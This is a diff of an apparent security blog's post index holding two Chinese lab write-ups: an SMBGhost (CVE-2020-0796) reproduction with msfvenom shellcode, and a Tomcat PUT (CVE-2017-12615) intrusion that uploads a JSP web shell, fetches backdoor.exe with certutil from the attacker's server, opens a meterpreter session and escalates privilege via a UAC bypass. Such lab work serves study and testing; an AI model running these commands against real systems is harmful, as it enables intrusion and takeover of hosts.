@@ -75,87 +75,6 @@ iptables -L -n --line-number
       </tags>
   </entry>
   <entry>
-    <title>CVE-2020-0796（永恒之黑)漏洞复现</title>
-    <url>/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="CVE-2020-0796（永恒之黑"><a href="#CVE-2020-0796（永恒之黑" class="headerlink" title="CVE-2020-0796（永恒之黑)"></a>CVE-2020-0796（永恒之黑)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote>
-<p>SMB远程代码执行漏洞</p>
-<p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵</p>
-<p>Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出</p>
-<p>利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端</p>
-</blockquote>
-<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 10 Version 1903 for 32-bit Systems
-Windows 10 Version 1903 for x64-based Systems
-Windows 10 Version 1903 for ARM64-based Systems
-Windows Server, Version 1903 (Server Core installation)
-Windows 10 Version 1909 for 32-bit Systems
-Windows 10 Version 1909 for x64-based Systems
-Windows 10 Version 1909 for ARM64-based Systems
-Windows Server, Version 1909 (Server Core installation)
-</code></pre>
-<p><strong>漏洞复现工具下载</strong></p>
-<p>漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
-<p>攻击poc：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
-<p>shell脚本：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
-<h2 id="蓝屏复现"><a href="#蓝屏复现" class="headerlink" title="蓝屏复现"></a>蓝屏复现</h2><p><strong>环境</strong></p>
-<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
-攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
-</code></pre>
-<ol>
-<li><strong>将目标机的防火墙关闭</strong></li>
-<li><strong>在攻击机上对目标机进行检测，看其是否存在漏洞。</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165146258.png" alt="image-20210224165146258"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165221346.png" alt="image-20210224165221346"></p>
-<ol start="3">
-<li><strong>利用下载的poc脚本发起攻击</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165539611.png" alt="image-20210224165539611"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165647306.png" alt="image-20210224165647306"></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><strong>环境</strong></p>
-<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
-攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
-</code></pre>
-<ol>
-<li><strong>生成一个反弹木马</strong></li>
-</ol>
-<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python
-
-   说明: 
-   #-p payload
-   #-e 编码方式
-   #-i 编码次数
-   #-b 过滤坏字符
-   #LHOST,LPORT 监听上线的主机IP和端口
-   #-f python 生成python格式
-   #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170157500.png" alt="image-20210224170157500"></p>
-<ol start="2">
-<li><strong>用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170414954.png" alt="image-20210224170414954"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170436001.png" alt="image-20210224170436001"></p>
-<ol start="3">
-<li><strong>开启msf监听模块</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170630883.png" alt="image-20210224170630883"></p>
-<ol start="4">
-<li><strong>运行exploit.py脚本，发起攻击反弹shell</strong></li>
-</ol>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171104264.png" alt="image-20210224171104264"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171704173.png" alt="image-20210224171704173"></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171715265.png" alt="image-20210224171715265"></p>
-<blockquote>
-<p>这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>复现</tag>
-        <tag>Windows 10</tag>
-        <tag>SMB</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>MySQL提权</title>
     <url>/2021/04/11/MySQL%E6%8F%90%E6%9D%83/</url>
     <content><![CDATA[<h1 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h1><blockquote>
@@ -334,99 +253,84 @@ exploit
       </tags>
   </entry>
   <entry>
-    <title>windows内核提权尝试</title>
-    <url>/2021/05/06/Windows%E6%8F%90%E6%9D%83%E5%B0%9D%E8%AF%95/</url>
-    <content><![CDATA[<h1 id="windows内核提权实战"><a href="#windows内核提权实战" class="headerlink" title="windows内核提权实战"></a>windows内核提权实战</h1><p>kali IP:  172.16.10.111</p>
-<p>靶机IP: 172.16.10.180</p>
+    <title>CVE-2020-0796（永恒之黑)漏洞复现</title>
+    <url>/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="CVE-2020-0796（永恒之黑"><a href="#CVE-2020-0796（永恒之黑" class="headerlink" title="CVE-2020-0796（永恒之黑)"></a>CVE-2020-0796（永恒之黑)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><blockquote>
+<p>SMB远程代码执行漏洞</p>
+<p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵</p>
+<p>Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出</p>
+<p>利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端</p>
+</blockquote>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Windows 10 Version 1903 for 32-bit Systems
+Windows 10 Version 1903 for x64-based Systems
+Windows 10 Version 1903 for ARM64-based Systems
+Windows Server, Version 1903 (Server Core installation)
+Windows 10 Version 1909 for 32-bit Systems
+Windows 10 Version 1909 for x64-based Systems
+Windows 10 Version 1909 for ARM64-based Systems
+Windows Server, Version 1909 (Server Core installation)
+</code></pre>
+<p><strong>漏洞复现工具下载</strong></p>
+<p>漏洞检测工具：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a></p>
+<p>攻击poc：<a href="https://github.com/eerykitty/CVE-2020-0796-PoC">https://github.com/eerykitty/CVE-2020-0796-PoC</a></p>
+<p>shell脚本：<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
+<h2 id="蓝屏复现"><a href="#蓝屏复现" class="headerlink" title="蓝屏复现"></a>蓝屏复现</h2><p><strong>环境</strong></p>
+<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
+攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
+</code></pre>
+<ol>
+<li><strong>将目标机的防火墙关闭</strong></li>
+<li><strong>在攻击机上对目标机进行检测，看其是否存在漏洞。</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165146258.png" alt="image-20210224165146258"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165221346.png" alt="image-20210224165221346"></p>
+<ol start="3">
+<li><strong>利用下载的poc脚本发起攻击</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165539611.png" alt="image-20210224165539611"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224165647306.png" alt="image-20210224165647306"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p><strong>环境</strong></p>
+<pre><code>目标机：Windows 10 1903     ip: 10.7.1.111（虚拟机）
+攻击机：Windows 10 20H2        ip: 10.7.6.254（物理机）
+</code></pre>
+<ol>
+<li><strong>生成一个反弹木马</strong></li>
+</ol>
+<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\x00' -i 1 -f python
+
+   说明: 
+   #-p payload
+   #-e 编码方式
+   #-i 编码次数
+   #-b 过滤坏字符
+   #LHOST,LPORT 监听上线的主机IP和端口
+   #-f python 生成python格式
+   #‘\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170157500.png" alt="image-20210224170157500"></p>
+<ol start="2">
+<li><strong>用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170414954.png" alt="image-20210224170414954"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170436001.png" alt="image-20210224170436001"></p>
+<ol start="3">
+<li><strong>开启msf监听模块</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224170630883.png" alt="image-20210224170630883"></p>
+<ol start="4">
+<li><strong>运行exploit.py脚本，发起攻击反弹shell</strong></li>
+</ol>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171104264.png" alt="image-20210224171104264"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171704173.png" alt="image-20210224171704173"></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210224171715265.png" alt="image-20210224171715265"></p>
 <blockquote>
-<p>2021-05-06自搭环境，漏洞为Tomcat PUT （cve-2017-12615）</p>
-<p>msf使用<code>tomcat_jsp_upload_bypass</code>模块</p>
+<p>这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。</p>
 </blockquote>
-<h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="对Web应用漏洞扫描探测"><a href="#对Web应用漏洞扫描探测" class="headerlink" title="对Web应用漏洞扫描探测"></a>对Web应用漏洞扫描探测</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212208824.png" alt="image-20210506212208824"></p>
-<blockquote>
-<p>发现服务的HTTP method方法中允许PUT，DELETE，允许客户端保存文件至服务器上</p>
-</blockquote>
-<h3 id="生成jsp反弹木马"><a href="#生成jsp反弹木马" class="headerlink" title="生成jsp反弹木马"></a>生成jsp反弹木马</h3><pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
-└─# msfconsole 
-msf6 > use payload/windows/shell_bind_tcp
-msf6 payload(windows/shell_bind_tcp) > set lport 4449
-msf6 payload(windows/shell_bind_tcp) > generate -f jsp -o shell.jsp
-[*] Writing 149075 bytes to shell.jsp...
-</code></pre>
-<h3 id="上传jsp木马"><a href="#上传jsp木马" class="headerlink" title="上传jsp木马"></a>上传jsp木马</h3><blockquote>
-<p>使用curl，通过PUT方式上传<code>/test.jsp/</code>文件</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">curl -X PUT http://172.16.10.180:8080/test.jsp/ -d @shell.jsp
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212432604.png" alt="image-20210506212432604"></p>
-<h3 id="访问Web木马"><a href="#访问Web木马" class="headerlink" title="访问Web木马"></a>访问Web木马</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213004651.png" alt="image-20210506213004651"></p>
-<h3 id="使用nc连接"><a href="#使用nc连接" class="headerlink" title="使用nc连接"></a>使用nc连接</h3><pre class=" language-shell"><code class="language-shell">nc 172.16.10.180 4449
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213049337.png" alt="image-20210506213049337"></p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
-<p>在C盘下创建back目录</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">chcp 437        //将编码改为英文，不会出现乱码
-cd c:\
-mkdir back
-cd c:\back
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213421968.png" alt="image-20210506213421968"></p>
-<blockquote>
-<p>上传backdoor.exe后门</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
-└─# msfpc windows 172.16.10.111
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213546472.png" alt="image-20210506213546472"></p>
-<blockquote>
-<p>python快速开启http服务</p>
-</blockquote>
-<pre class=" language-python"><code class="language-python">python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">8180</span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213906822.png" alt="image-20210506213906822"></p>
-<blockquote>
-<p>靶机远程下载<code>backdoor.exe</code></p>
-</blockquote>
-<pre class=" language-cmd"><code class="language-cmd">certutil -urlcache -split -f http://172.16.10.111:8180/backdoor.exe
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214012023.png" alt="image-20210506214012023"></p>
-<blockquote>
-<p>kali开启监听</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">──(root💀kali)-[/home/sheng]
-└─# msfconsole -r windows-meterpreter-staged-reverse-tcp-443-exe.rc
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214303446.png" alt="image-20210506214303446"></p>
-<blockquote>
-<p>靶机执行<code>backdoor.exe</code></p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">c:\back>backdoor.exe
-backdoor.exe
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214355334.png" alt="image-20210506214355334"></p>
-<blockquote>
-<p>得到shell</p>
-</blockquote>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214422916.png" alt="image-20210506214422916"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><blockquote>
-<p>使用msf中<code>post/multi/recon/local_exploit_suggester</code>模块查看可利用的提权模块</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
-msf6 post(multi/recon/local_exploit_suggester) > set session 1
-session => 1
-msf6 post(multi/recon/local_exploit_suggester) > exploit
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214605716.png" alt="image-20210506214605716"></p>
-<blockquote>
-<p>使用<code>exploit/windows/local/bypassuac_eventvwr</code>模块进行提权</p>
-</blockquote>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214731844.png" alt="image-20210506214731844"></p>
-<p><strong>得到system权限，提权成功</strong></p>
 ]]></content>
       <tags>
         <tag>复现</tag>
-        <tag>提权</tag>
+        <tag>Windows 10</tag>
+        <tag>SMB</tag>
       </tags>
   </entry>
   <entry>
@@ -651,6 +555,102 @@ disable_functions<span class="token operator">=</span>phpinfo<span class="token 
       <tags>
         <tag>PHP</tag>
         <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一次windows渗透测试</title>
+    <url>/2021/05/06/%E4%B8%80%E6%AC%A1Windows%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<h1 id="windows内核提权实战"><a href="#windows内核提权实战" class="headerlink" title="windows内核提权实战"></a>windows内核提权实战</h1><p>kali IP:  172.16.10.111</p>
+<p>靶机IP: 172.16.10.180</p>
+<blockquote>
+<p>2021-05-06自搭环境，漏洞为Tomcat PUT （cve-2017-12615）</p>
+<p>msf使用<code>tomcat_jsp_upload_bypass</code>模块</p>
+</blockquote>
+<h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="对Web应用漏洞扫描探测"><a href="#对Web应用漏洞扫描探测" class="headerlink" title="对Web应用漏洞扫描探测"></a>对Web应用漏洞扫描探测</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212208824.png" alt="image-20210506212208824"></p>
+<blockquote>
+<p>发现服务的HTTP method方法中允许PUT，DELETE，允许客户端保存文件至服务器上</p>
+</blockquote>
+<h3 id="生成jsp反弹木马"><a href="#生成jsp反弹木马" class="headerlink" title="生成jsp反弹木马"></a>生成jsp反弹木马</h3><pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
+└─# msfconsole 
+msf6 > use payload/windows/shell_bind_tcp
+msf6 payload(windows/shell_bind_tcp) > set lport 4449
+msf6 payload(windows/shell_bind_tcp) > generate -f jsp -o shell.jsp
+[*] Writing 149075 bytes to shell.jsp...
+</code></pre>
+<h3 id="上传jsp木马"><a href="#上传jsp木马" class="headerlink" title="上传jsp木马"></a>上传jsp木马</h3><blockquote>
+<p>使用curl，通过PUT方式上传<code>/test.jsp/</code>文件</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">curl -X PUT http://172.16.10.180:8080/test.jsp/ -d @shell.jsp
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212432604.png" alt="image-20210506212432604"></p>
+<h3 id="访问Web木马"><a href="#访问Web木马" class="headerlink" title="访问Web木马"></a>访问Web木马</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213004651.png" alt="image-20210506213004651"></p>
+<h3 id="使用nc连接"><a href="#使用nc连接" class="headerlink" title="使用nc连接"></a>使用nc连接</h3><pre class=" language-shell"><code class="language-shell">nc 172.16.10.180 4449
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213049337.png" alt="image-20210506213049337"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
+<p>在C盘下创建back目录</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">chcp 437        //将编码改为英文，不会出现乱码
+cd c:\
+mkdir back
+cd c:\back
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213421968.png" alt="image-20210506213421968"></p>
+<blockquote>
+<p>上传backdoor.exe后门</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
+└─# msfpc windows 172.16.10.111
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213546472.png" alt="image-20210506213546472"></p>
+<blockquote>
+<p>python快速开启http服务</p>
+</blockquote>
+<pre class=" language-python"><code class="language-python">python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">8180</span>
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213906822.png" alt="image-20210506213906822"></p>
+<blockquote>
+<p>靶机远程下载<code>backdoor.exe</code></p>
+</blockquote>
+<pre class=" language-cmd"><code class="language-cmd">certutil -urlcache -split -f http://172.16.10.111:8180/backdoor.exe
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214012023.png" alt="image-20210506214012023"></p>
+<blockquote>
+<p>kali开启监听</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">──(root💀kali)-[/home/sheng]
+└─# msfconsole -r windows-meterpreter-staged-reverse-tcp-443-exe.rc
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214303446.png" alt="image-20210506214303446"></p>
+<blockquote>
+<p>靶机执行<code>backdoor.exe</code></p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">c:\back>backdoor.exe
+backdoor.exe
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214355334.png" alt="image-20210506214355334"></p>
+<blockquote>
+<p>得到shell</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214422916.png" alt="image-20210506214422916"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><blockquote>
+<p>使用msf中<code>post/multi/recon/local_exploit_suggester</code>模块查看可利用的提权模块</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf6 post(multi/recon/local_exploit_suggester) > exploit
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214605716.png" alt="image-20210506214605716"></p>
+<blockquote>
+<p>使用<code>exploit/windows/local/bypassuac_eventvwr</code>模块进行提权</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214731844.png" alt="image-20210506214731844"></p>
+<p><strong>得到system权限，提权成功</strong></p>
+]]></content>
+      <tags>
+        <tag>复现</tag>
+        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
